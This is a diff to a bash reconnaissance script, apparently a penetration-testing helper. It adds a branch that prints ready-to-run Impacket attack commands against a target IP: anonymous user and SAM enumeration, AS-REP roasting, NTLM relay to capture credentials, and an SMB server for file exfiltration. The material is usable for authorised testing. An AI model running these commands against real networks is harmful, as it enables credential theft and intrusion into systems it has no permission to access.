@@ -179,6 +179,36 @@ if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
     echo -e "\033[93m[!] Note: Replace DOMAIN with actual domain name if not provided\033[0m"
     echo -e "\033[96m[+] For full list: ls /usr/share/doc/python3-impacket/examples/\033[0m"
     echo ""
+else
+    # Show anonymous Impacket tools when no credentials
+    echo -e "\n\033[96m[+] Impacket Tools - Anonymous Enumeration:\033[0m"
+    echo ""
+    echo "# 1. User Enumeration (no credentials needed):"
+    echo "impacket-lookupsid -no-pass anonymous@$IP                           # Enumerate users via SID"
+    echo "impacket-samrdump $IP                                               # Dump SAM via RPC (anonymous)"
+    if [ -n "$domain" ]; then
+        echo "impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass -dc-ip $IP  # AS-REP roasting (no creds)"
+    else
+        echo "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP   # AS-REP roasting (no creds)"
+    fi
+    echo ""
+    echo "# 2. Network Enumeration:"
+    echo "impacket-rpcdump $IP                                                # Enumerate RPC endpoints"
+    echo "impacket-netview $IP                                                # Network enumeration"
+    echo ""
+    echo "# 3. SMB Enumeration (try anonymous):"
+    echo "impacket-smbclient -no-pass anonymous@$IP                           # Try anonymous SMB access"
+    echo ""
+    echo "# 4. NTLM Relay (capture credentials):"
+    echo "impacket-ntlmrelayx -tf targets.txt -smb2support                    # NTLM relay attack"
+    echo "impacket-ntlmrelayx -t ldap://$IP -smb2support                      # Relay to LDAP"
+    echo ""
+    echo "# 5. Start SMB server (for file exfiltration):"
+    echo "impacket-smbserver share \$(pwd) -smb2support                        # Start SMB server"
+    echo ""
+    echo -e "\033[93m[!] Note: Many tools work better with credentials. Run with -u and -p flags.\033[0m"
+    echo -e "\033[96m[+] For full list: ls /usr/share/doc/python3-impacket/examples/\033[0m"
+    echo ""
 fi
 
 echo -e "\n\033[96m[+] OS info, Name, Domain, SMB versions\033[0m\n"
